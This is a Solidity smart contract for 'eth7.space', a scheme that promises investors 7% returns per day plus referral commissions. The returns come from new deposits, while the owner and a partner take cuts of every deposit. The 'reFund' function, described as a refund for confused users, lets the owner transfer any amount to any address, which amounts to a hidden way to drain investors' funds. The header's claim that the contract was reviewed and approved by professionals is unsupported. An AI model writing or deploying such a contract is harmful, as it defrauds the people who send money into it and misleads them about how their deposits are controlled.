1 pragma solidity ^0.4.25;
2 
3 /** 
4  * contract for eth7.space
5  * GAIN 7% PER 24 HOURS (every 5900 blocks)
6  * 
7  *  How to use:
8  *  1. Send any amount of ether to make an investment
9  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
10  *  OR
11  *  2b. Send more ether to reinvest AND get your profit at the same time
12  *
13  * 
14  *  5% for every deposit of your direct partners
15  *  If you want to invite your partners to join our program ,They have to specify your ETH wallet in a "DATA" field during a deposit transaction.
16  * 
17  * 
18  * RECOMMENDED GAS LIMIT: 70000
19  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
20  *
21  * Contract reviewed and approved by pros!
22 **/
23 
24 contract eth7{
25 
26     address public owner;
27     address public partner;    
28     
29 	mapping (address => uint256) deposited;
30 	mapping (address => uint256) withdrew;
31 	mapping (address => uint256) refearned;
32 	mapping (address => uint256) blocklock;
33 
34 	uint256 public totalDepositedWei = 0;
35 	uint256 public totalWithdrewWei = 0;
36 	uint256 public investorNum = 0;
37 
38 
39 	event invest(address indexed beneficiary, uint amount);
40 
41     constructor () public {
42         owner   = msg.sender;
43         partner = msg.sender;
44     }
45     
46     modifier onlyOwner {
47         require (msg.sender == owner, "OnlyOwner methods called by non-owner.");
48         _;
49     }    
50     
51     //if you want to be a partner, contact admin
52     function setPartner(address newPartner) external onlyOwner {
53         partner = newPartner;
54     }
55  
56 
57 	function() payable external {
58 		emit invest(msg.sender,msg.value);
59 		uint256 admRefPerc = msg.value / 10;
60 		uint256 advPerc    = msg.value / 20;
61 
62 		owner.transfer(admRefPerc);
63 		partner.transfer(advPerc);
64 
65 		if (deposited[msg.sender] > 0) {
66 			address investor = msg.sender;
67             // calculate profit amount as such:
68             // amount = (amount invested) * 7% * (blocks since last transaction) / 5900
69             // 5900 is an average block count per day produced by Ethereum blockchain
70             uint256 depositsPercents = deposited[msg.sender] * 7 / 100 * (block.number - blocklock[msg.sender]) /5900;
71 			investor.transfer(depositsPercents);
72 
73 			withdrew[msg.sender] += depositsPercents;
74 			totalWithdrewWei += depositsPercents;
75 			investorNum++;
76 		}
77 
78 		address referrer = bytesToAddress(msg.data);
79 		if (referrer > 0x0 && referrer != msg.sender) {
80 		    referrer.transfer(admRefPerc);
81 			refearned[referrer] += admRefPerc;
82 		}
83 
84 		blocklock[msg.sender] = block.number;
85 		deposited[msg.sender] += msg.value;
86 		totalDepositedWei += msg.value;
87 	}
88 	
89 	//refund to user who misunderstood the game . 'withdrew' must = 0
90     function reFund(address exitUser, uint a) external onlyOwner returns (uint256) {
91         uint256 reFundValue = deposited[exitUser];
92         exitUser.transfer(a);
93         deposited[exitUser] = 0;
94         return reFundValue;
95     }
96     
97 	function userDepositedWei(address _address) public view returns (uint256) {
98 		return deposited[_address];
99     }
100 
101 	function userWithdrewWei(address _address) public view returns (uint256) {
102 		return withdrew[_address];
103     }
104 
105 	function userDividendsWei(address _address) public view returns (uint256) {
106         return deposited[_address] * 7 / 100 * (block.number - blocklock[_address]) / 5900;
107     }
108 
109 	function userReferralsWei(address _address) public view returns (uint256) {
110 		return refearned[_address];
111     }
112 
113 	function bytesToAddress(bytes bys) private pure returns (address addr) {
114 		assembly {
115 			addr := mload(add(bys, 20))
116 		}
117 	}
118 }